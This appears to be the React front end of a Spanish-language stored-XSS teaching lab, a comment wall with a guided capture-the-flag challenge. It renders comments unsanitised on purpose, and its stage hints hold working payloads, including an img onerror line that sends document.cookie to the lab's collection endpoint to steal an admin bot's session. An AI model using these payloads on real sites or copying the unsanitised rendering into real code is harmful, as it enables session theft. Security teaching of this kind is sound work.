import React, { useEffect, useRef, useState } from 'react';

// Convierte el nombre del alumno en un identificador de sala seguro.
function slugify(name) {
  return name
    .trim()
    .toLowerCase()
    .replace(/\s+/g, '-')
    .replace(/[^a-z0-9_-]/g, '');
}

function getRoom() {
  const p = new URLSearchParams(window.location.search);
  return (p.get('room') || '').trim();
}

function cerrarSesion() {
  window.location.href = '/';
}

const Banner = () => (
  <div className="lab-banner">
    ⚠️ Laboratorio educativo de seguridad web (XSS almacenado). Entorno autorizado y
    desechable del curso. No uses estas técnicas fuera de este laboratorio.
  </div>
);

// --- Login: el alumno escribe su nombre y entra a su sala ---
function Login() {
  const [name, setName] = useState('');
  const slug = slugify(name);

  function entrar(e) {
    e.preventDefault();
    if (!slug) return;
    window.location.href = `/board?room=${encodeURIComponent(slug)}`;
  }

  return (
    <div className="wrap login">
      <Banner />
      <div className="login-card">
        <h1>Muro de Comentarios</h1>
        <p className="hint">Escribe tu nombre para entrar a tu sala del laboratorio.</p>
        <form onSubmit={entrar}>
          <input
            className="caja-login"
            placeholder="Tu nombre"
            value={name}
            onChange={(e) => setName(e.target.value)}
            autoFocus
          />
          <button className="btn-azul" type="submit" disabled={!slug}>
            Entrar
          </button>
        </form>
        {name.trim() && (
          <p className="preview">
            Tu sala será: <code>{slug || '—'}</code>
          </p>
        )}
      </div>
    </div>
  );
}

// Definición de las etapas del reto. `key` coincide con el campo de /status.
function etapasDef(room) {
  return [
    {
      key: 'hasComments',
      titulo: 'Reconoce el muro',
      objetivo:
        'Escribe cualquier texto y pulsa "Publicar comentario". Observa que aparece abajo en "Comentarios publicados". Así funciona la entrada de datos que vas a atacar.',
      pista: 'Publica un mensaje normal, por ejemplo: hola mundo',
      ejemplo: 'hola mundo'
    },
    {
      key: 'htmlInjected',
      titulo: '¿El muro sanitiza? Inyecta HTML',
      objetivo:
        'Comprueba si el muro interpreta HTML en vez de mostrarlo como texto plano. Publica un comentario con una etiqueta de formato y mira si cambia la apariencia. Si cambia, el muro NO sanitiza: es vulnerable.',
      pista: 'Prueba una etiqueta de formato como un encabezado o negrita.',
      ejemplo: '<h3>esto es HTML</h3>'
    },
    {
      key: 'scriptTried',
      titulo: 'Prueba <script> (y entiende por qué NO corre)',
      objetivo:
        'El payload "obvio" es una etiqueta <script>. Pruébalo. Verás que NO se ejecuta: cuando el HTML se inserta con innerHTML (como hace esta app), el navegador no corre las etiquetas <script> añadidas así. Lección clave antes de seguir.',
      pista: 'Publica un <script> con un alert y comprueba que no pasa nada.',
      ejemplo: "<script>alert('xss')</script>"
    },
    {
      key: 'jsExecuted',
      titulo: 'Ejecuta JS con un manejador de eventos',
      objetivo:
        'Si <script> no corre, usa un atributo de evento. Una imagen con una fuente inválida dispara su onerror, y ahí SÍ se ejecuta tu JavaScript. Haz que llame al "beacon" del lab para demostrar la ejecución.',
      pista: `Imagen rota que dispara onerror hacia /beacon de tu sala.`,
      ejemplo: `<img src=x onerror="fetch('/beacon?room=${room}')">`
    },
    {
      key: 'cookieCaptured',
      titulo: 'Roba una cookie',
      objetivo:
        'Ya ejecutas JS. Ahora envía document.cookie al buzón /collect. OJO: capturarás TU cookie de invitado (session=invitado), NO la flag. La flag no vive en tu sesión... ¿en la de quién vivirá?',
      pista: 'Cambia el beacon por /collect y adjunta document.cookie.',
      ejemplo: `<img src=x onerror="fetch('/collect?room=${room}&c='+document.cookie)">`
    },
    {
      key: 'flagCaptured',
      titulo: 'XSS almacenado: roba la cookie del ADMIN',
      objetivo:
        'La flag está en la cookie de un "admin". Como tu comentario quedó ALMACENADO, un bot admin lo cargará cada ~10 s y tu payload correrá en SU sesión, enviando SU cookie (con la flag) a /collect. No necesitas otro payload: deja publicado el de la etapa 5 y espera.',
      pista: 'No publiques nada nuevo. Solo espera al bot admin (~10-15 s).',
      ejemplo: null
    }
  ];
}

// --- Una etapa de la guía ---
function Etapa({ n, def, estado, activa, onInsertar }) {
  const [verPista, setVerPista] = useState(false);
  const clase = estado === 'done' ? 'done' : activa ? 'activa' : 'bloqueada';

  return (
    <li className={`etapa ${clase}`}>
      <span className="etapa-num">{estado === 'done' ? '✓' : n}</span>
      <div className="etapa-cuerpo">
        <div className="etapa-titulo">{def.titulo}</div>
        {(activa || estado === 'done') && <div className="etapa-objetivo">{def.objetivo}</div>}

        {activa && (
          <div className="etapa-acciones">
            <button className="btn-pista" type="button" onClick={() => setVerPista((v) => !v)}>
              {verPista ? 'Ocultar pista' : 'Ver pista'}
            </button>
            {verPista && (
              <div className="pista">
                <p>{def.pista}</p>
                {def.ejemplo && (
                  <>
                    <code className="pista-codigo">{def.ejemplo}</code>
                    <button
                      className="btn-sec"
                      type="button"
                      onClick={() => onInsertar(def.ejemplo)}
                    >
                      Insertar en el cuadro
                    </button>
                  </>
                )}
              </div>
            )}
          </div>
        )}
      </div>
    </li>
  );
}

// --- Muro + reto guiado ---
function Board({ room }) {
  const [text, setText] = useState('');
  const [comments, setComments] = useState([]);
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState({});
  const taRef = useRef(null);

  const etapas = etapasDef(room);

  async function load() {
    try {
      const [c, s] = await Promise.all([
        fetch(`/api/comments?room=${encodeURIComponent(room)}`).then((r) => r.json()),
        fetch(`/status?room=${encodeURIComponent(room)}`).then((r) => r.json())
      ]);
      setComments(c);
      setStatus(s);
    } catch (e) {
      /* reintenta en el próximo tick */
    }
  }

  useEffect(() => {
    load();
    const id = setInterval(load, 3000);
    return () => clearInterval(id);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  async function publicar() {
    if (!text.trim()) return;
    setLoading(true);
    try {
      await fetch('/api/comments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ room, text })
      });
      setText('');
      await load();
    } finally {
      setLoading(false);
    }
  }

  function insertar(ejemplo) {
    setText(ejemplo);
    if (taRef.current) taRef.current.focus();
  }

  // Índice de la primera etapa no completada.
  const activaIdx = etapas.findIndex((e) => !status[e.key]);
  const completadas = etapas.filter((e) => status[e.key]).length;
  const flag = status.flag;

  return (
    <div className="wrap">
      <Banner />

      <div className="topbar">
        <h1>Muro de Comentarios — Sala: {room}</h1>
        <button className="btn-salir" onClick={cerrarSesion}>Cerrar sesión</button>
      </div>
      <p className="hint">
        Estás en tu sala <strong>{room}</strong>. Resuelve el reto paso a paso: la guía detecta
        sola cada logro.
      </p>

      <div className="reto">
        <div className="reto-head">
          <h2>Reto guiado</h2>
          <span className="progreso">{completadas}/{etapas.length} etapas</span>
        </div>

        {flag && (
          <div className="exito">
            🎉 ¡Flag capturada! <code>{flag}</code>
          </div>
        )}

        <ol className="etapas">
          {etapas.map((def, i) => (
            <Etapa
              key={def.key}
              n={i + 1}
              def={def}
              estado={status[def.key] ? 'done' : 'pendiente'}
              activa={i === activaIdx}
              onInsertar={insertar}
            />
          ))}
        </ol>

        {activaIdx === 4 && status.cookieCaptured && !flag && (
          <p className="esperando">Cookie capturada. Esperando a que el bot admin cargue tu comentario…</p>
        )}
        {activaIdx === 5 && !flag && (
          <p className="esperando">Esperando al bot admin (~10-15 s)…</p>
        )}
      </div>

      <textarea
        ref={taRef}
        className="caja"
        placeholder="Escribe tu comentario aquí..."
        value={text}
        onChange={(e) => setText(e.target.value)}
        rows={4}
      />
      <div className="acciones">
        <button className="btn-azul" onClick={publicar} disabled={loading}>
          Publicar comentario
        </button>
      </div>

      <h2>Comentarios publicados</h2>
      <div className="lista">
        {comments.length === 0 && <p className="vacio">Aún no hay comentarios en esta sala.</p>}
        {comments.map((c, i) => (
          <div className="comentario" key={i}>
            {/*
              VULNERABILIDAD DELIBERADA DEL LABORATORIO:
              el comentario se renderiza sin sanitizar con dangerouslySetInnerHTML.
              Es el objetivo didáctico del reto; NO añadir DOMPurify ni escapado.
            */}
            <div dangerouslySetInnerHTML={{ __html: c.text }} />
            <div className="meta">{new Date(c.ts).toLocaleString()}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

export default function App() {
  const room = getRoom();
  return room ? <Board room={room} /> : <Login />;
}
